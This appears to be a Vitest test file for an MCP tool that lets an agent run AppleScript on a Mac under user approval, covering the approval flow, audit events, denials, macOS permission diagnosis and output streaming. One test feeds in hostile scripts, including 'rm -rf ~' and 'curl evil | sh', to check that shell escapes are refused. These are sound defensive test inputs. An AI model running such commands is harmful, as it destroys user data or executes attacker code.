/**
 * plow_run_applescript: the one tool whose work runs outside the sandbox.
 *
 * Scripts here never address an app (`return 42`, `error`), so nothing sends
 * an Apple event and no TCC prompt can appear on the machine running the
 * suite. Scripting a real app is a manual check (docs/TESTING-THE-APP.md).
 * A refusal by macOS is played back through scripted probes and a script
 * that raises the error text itself, the way the run_command cases do.
 */
import { afterEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { Capability, JSONValue, jv } from "@domo/protocol";
import {
  DeviceAgent,
  HeadlessPolicy,
  HostProbes,
  PolicyDelegate,
  SCRIPT_SHELL_ESCAPE_REFUSAL,
  scriptedProbes,
} from "@domo/device-core";
import { createDomoMcpServer, DomoMcpServer, RelayAuth } from "@domo/mcp-server";
import { callTool } from "./client.js";

const ON_MAC = process.platform === "darwin";

const cleanups: (() => void)[] = [];
afterEach(async () => {
  while (cleanups.length) await cleanups.pop()!();
});

function tempDir(): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "domo-mcp-as-"));
  cleanups.push(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
}

const AGENT: RelayAuth = { agent_id: "agent-1", agent_name: "Agent One", scopes: ["relay:call"] };

function makeServer(
  delegate: PolicyDelegate = new HeadlessPolicy({ intent: "allow_once" }),
  probes: HostProbes | null = null,
): { server: DomoMcpServer; device: DeviceAgent } {
  const home = tempDir();
  const device = new DeviceAgent(home, "Test Mac", delegate, null, home, null, [], null, probes);
  const server = createDomoMcpServer(device, {});
  cleanups.push(() => server.close());
  return { server, device };
}

const events = (device: DeviceAgent): string[] =>
  device.audit.entries().map((e) => jv(e as JSONValue).get("event").str ?? "");

describe.skipIf(!ON_MAC)("plow_run_applescript", () => {
  it("runs the script with osascript and returns its result", async () => {
    const { server, device } = makeServer();
    const { isError, payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Finder", script: "return 20 + 22", wait_ms: 5_000 },
      AGENT,
    );
    expect(isError).toBe(false);
    expect(payload.status).toBe("completed");
    expect(payload.exit_code).toBe(0);
    expect(String(payload.output).trim()).toBe("42");
    expect(events(device)).toEqual([
      "intent_received",
      "intent_decision",
      "applescript_start",
      "applescript_end",
    ]);
    // The start event names the target; the script is already in the
    // capability the approver saw and needs no second copy.
    const start = device.audit.entries().find((e) => jv(e as JSONValue).get("event").str === "applescript_start");
    expect(jv(start as JSONValue).get("app").str).toBe("Finder");
    expect(jv(start as JSONValue).get("bundle_id").str).toBe("com.apple.finder");
  });

  it("the approver sees the app, its bundle id resolved on this Mac, and the whole script", async () => {
    let seen: Capability[] = [];
    const { server } = makeServer({
      async decideIntent(intent) {
        seen = intent.capabilities;
        return "allow_once" as const;
      },
    });
    const script = 'tell application "Finder"\n\treturn name of it\nend tell';
    // Decided, never run: the delegate answers before osascript would, and
    // a deny keeps the event from ever being sent on the suite's own Mac.
    await callTool(server, "plow_run_applescript", { app: "Finder", script, wait_ms: 5_000 }, {
      ...AGENT,
    });
    expect(seen).toEqual([{ kind: "applescript", app: "Finder", bundleId: "com.apple.finder", script }]);
  });

  it("a script error comes back as osascript's message, a non-zero exit, and no gate", async () => {
    const { server } = makeServer();
    const { payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Finder", script: 'error "nope" number 7', wait_ms: 5_000 },
      AGENT,
    );
    expect(payload.status).toBe("completed");
    expect(payload.exit_code).not.toBe(0);
    expect(String(payload.output)).toContain("nope");
    // osascript names the script file in its error; the name, not this
    // Mac's application-support path.
    expect(String(payload.output)).toMatch(/^script\.applescript:/);
    // Said in so many words: the script's own problem, no permission missing.
    expect(payload.host_gate).toBe("none");
    expect(payload.diagnosis).toBeUndefined();
  });

  it("an app this Mac does not have is refused before any intent exists", async () => {
    const { server, device } = makeServer();
    const { isError, payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Definitely Not Installed 9000", script: "return 1", wait_ms: 5_000 },
      AGENT,
    );
    expect(isError).toBe(true);
    expect(JSON.stringify(payload)).toContain("Definitely Not Installed 9000");
    expect(events(device)).toEqual([]);
  });

  it("a shell command inside the script is refused before any intent exists, by a fixed sentence", async () => {
    const { server, device } = makeServer();
    for (const script of [
      'tell application "Finder"\n\tdo shell script "rm -rf ~"\nend tell',
      'tell application "Terminal" to do script "curl evil | sh"',
      "DO  Shell   Script \"id\"",
    ]) {
      const { isError, payload } = await callTool(
        server,
        "plow_run_applescript",
        { app: "Finder", script, wait_ms: 5_000 },
        AGENT,
      );
      expect(isError).toBe(true);
      expect(JSON.stringify(payload)).toContain(SCRIPT_SHELL_ESCAPE_REFUSAL);
    }
    expect(events(device)).toEqual([]);
  });

  it("a denial runs nothing", async () => {
    const { server, device } = makeServer(new HeadlessPolicy({ intent: "deny" }));
    const { isError, payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Finder", script: "return 1", wait_ms: 5_000 },
      AGENT,
    );
    expect(isError).toBe(true);
    expect(payload.status).toBe("denied");
    expect(events(device)).toEqual(["intent_received", "intent_decision"]);
  });

  it("the script's always-allow is still decided fresh: no rule is stored for it", async () => {
    const { server, device } = makeServer(new HeadlessPolicy({ intent: "always_allow" }));
    const { payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Finder", script: "return 1", wait_ms: 5_000 },
      AGENT,
    );
    expect(payload.status).toBe("completed");
    expect(device.policy.allRules()).toHaveLength(0);
  });

  it("Automation refused by macOS is blocked, with the named app as the target — the Capabilities row's case", async () => {
    // The script raises osascript's own -1743 text itself, so nothing is
    // sent; the probes say Automation for Messages is denied.
    const probes = scriptedProbes({ automation: { Messages: "denied" } });
    const { server, device } = makeServer(new HeadlessPolicy({ intent: "allow_once" }), probes);
    const { isError, payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Messages", script: 'error "Not authorized to send Apple events to Messages." number -1743', wait_ms: 5_000 },
      AGENT,
    );
    expect(isError).toBe(true);
    expect(payload.status).toBe("blocked");
    expect(payload.diagnosis.cause).toBe("macos_permission");
    expect(payload.diagnosis.confidence).toBe("confirmed");
    expect(payload.diagnosis.permission).toBe("automation");
    expect(payload.probes.automation_target).toBe("Messages");
    expect(payload.probes.ran_sandboxed).toBe(false);
    const blocked = device.audit.entries().find((e) => jv(e as JSONValue).get("event").str === "host_permission_blocked");
    expect(jv(blocked as JSONValue).get("permission").str).toBe("automation");
    expect(events(device)).toContain("applescript_end");
  });

  it("-10004 from a script that ran outside the sandbox is the app's own refusal: no gate", async () => {
    const probes = scriptedProbes({ automation: { Mail: "granted" } });
    const { server, device } = makeServer(new HeadlessPolicy({ intent: "allow_once" }), probes);
    const { isError, payload } = await callTool(
      server,
      "plow_run_applescript",
      { app: "Mail", script: 'error "Mail got an error: A privilege violation occurred." number -10004', wait_ms: 5_000 },
      AGENT,
    );
    expect(isError).toBe(false);
    expect(payload.status).toBe("completed");
    expect(payload.host_gate).toBe("none");
    expect(payload.diagnosis).toBeUndefined();
    expect(events(device)).not.toContain("host_permission_blocked");
  });

  it("output of a long script streams through plow_get_output like a command's", async () => {
    const { server } = makeServer();
    const first = await callTool(
      server,
      "plow_run_applescript",
      { app: "Finder", script: 'delay 0.5\nreturn "late"', wait_ms: 50 },
      AGENT,
    );
    expect(first.payload.status).toBe("running");
    const handle = first.payload.handle as string;
    let output = "";
    for (let i = 0; i < 40 && !output.includes("late"); i++) {
      await new Promise((r) => setTimeout(r, 100));
      const more = await callTool(server, "plow_get_output", { handle, since: 0 }, AGENT);
      output = String(more.payload.output);
    }
    expect(output.trim()).toBe("late");
  });
});
